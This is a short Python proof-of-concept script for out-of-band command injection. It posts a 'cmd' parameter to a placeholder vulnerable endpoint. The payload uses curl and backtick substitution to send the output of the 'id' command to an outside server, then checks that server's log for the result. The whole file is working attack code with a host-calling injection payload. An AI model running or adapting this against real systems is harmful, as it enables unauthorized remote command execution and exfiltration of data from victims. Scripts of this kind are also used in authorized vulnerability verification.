import requests
import time

oob_server = 'http://104.225.xxx.xx:8888/'       # OOB Server
target_url = "http://victim.com:8443/vuln"      # vulnerable host
check_url = oob_server + 'checklog'

def send_poc():
    # Sending request with POC to vulnerable host
    param = f"cmd=curl {oob_server}`id`"

    try:
        print("-"*80)
        print(f"Target: {target_url}\nMethod: POST\nRequest Body:")
        print("-"*80)
        print(f"{param}")
        print("-"*80)

        print("[+] Sending request with POC ..")
        response = requests.post(target_url, data=param, timeout=5)
        response.raise_for_status()
        print(f"[+] Got response from {target_url} \nStatus Code: {response.status_code}\nResponse Body:")
        print("="*80)
        print(response.content.decode())
        print("="*80)
        time.sleep(2)
    except Exception as e:
        #print(f"Error in sending POC to {url}: {e}\n")
        print(f"[!] Error in sending POC to {target_url}\n")


def is_vulnerable():

    send_poc()

    try:
        response = requests.get(check_url, timeout=5)
        response.raise_for_status()
        if response.text:
            print(f"[+] Command executed result: {response.text}")

    except Exception as e:
    #print(f"{monitorURL}: {e}")
        print(f"[!] No content from {check_url}")
    time.sleep(2)


if __name__ == "__main__":
    print(f"OOB Server is: {oob_server}")
    is_vulnerable()
